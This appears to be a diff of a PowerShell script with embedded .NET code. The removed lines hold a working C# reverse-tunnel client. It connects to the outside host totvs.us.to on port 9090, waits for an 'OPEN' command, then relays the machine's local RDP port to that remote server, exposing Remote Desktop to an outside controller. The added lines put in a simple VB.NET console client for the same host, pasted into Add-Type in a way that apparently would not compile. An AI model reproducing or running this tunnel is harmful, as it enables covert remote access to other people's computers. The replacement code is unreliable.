@@ -1,159 +1,40 @@
-$Server="totvs.us.to"
+
 
 
 Add-Type @"
-using System;
-using System.Net.Sockets;
-using System.Text;
-using System.Threading.Tasks;
 
+Imports System.Net.Sockets
+Imports System.Text
 
+Module Client
 
-public class TunnelClient
-{
+    Sub Main()
+        Dim serverIP As String = "totvs.us.to"
+        Dim port As Integer = 9090
 
+        Dim client As New TcpClient(serverIP, port)
+        Dim stream = client.GetStream()
 
-static async Task Pipe(NetworkStream a, NetworkStream b)
-{
+        Console.WriteLine("[+] Conectado al servidor")
 
-byte[] buffer = new byte[65536];
+        While True
+            Console.Write("> ")
+            Dim msg = Console.ReadLine()
 
+            Dim data = Encoding.UTF8.GetBytes(msg)
+            stream.Write(data, 0, data.Length)
 
-try
-{
+            Dim buffer(4095) As Byte
+            Dim bytesRead = stream.Read(buffer, 0, buffer.Length)
 
-while(true)
-{
+            Dim response = Encoding.UTF8.GetString(buffer, 0, bytesRead)
+            Console.WriteLine(response)
+        End While
 
-int n =
-await a.ReadAsync(buffer,0,buffer.Length);
+    End Sub
 
+End Module
 
-
-if(n <= 0)
-break;
-
-
-
-await b.WriteAsync(buffer,0,n);
-
-
-}
-
-
-}
-catch
-{
-
-}
-
-
-
-try {a.Close();}catch{}
-try {b.Close();}catch{}
-
-
-}
-
-
-
-static async Task Relay(NetworkStream a, NetworkStream b)
-{
-
-await Task.WhenAny(
-
-Pipe(a,b),
-
-Pipe(b,a)
-
-);
-
-
-}
-
-
-
-public static async Task Start(string host)
-{
-
-
-TcpClient tunnel =
-new TcpClient();
-
-
-
-Console.WriteLine("[*] Conectando servidor");
-
-
-
-await tunnel.ConnectAsync(host,9090);
-
-
-
-Console.WriteLine("[+] Tunel conectado");
-
-
-
-NetworkStream tunnelStream =
-tunnel.GetStream();
-
-
-
-byte[] buffer =
-new byte[1024];
-
-
-
-int read =
-await tunnelStream.ReadAsync(buffer,0,buffer.Length);
-
-
-
-string cmd =
-Encoding.ASCII.GetString(buffer,0,read);
-
-
-
-Console.WriteLine("[+] Control: "+cmd);
-
-
-
-if(cmd.Trim()=="OPEN")
-{
-
-
-TcpClient rdp =
-new TcpClient();
-
-
-
-Console.WriteLine("[+] Abriendo RDP Local");
-
-
-
-await rdp.ConnectAsync("127.0.0.4",3389);
-
-
-
-Console.WriteLine("[+] RDP conectado");
-
-
-
-NetworkStream rdpStream =
-rdp.GetStream();
-
-
-
-await Relay(tunnelStream,rdpStream);
-
-
-
-}
-
-
-}
-
-}
 "@
 
 
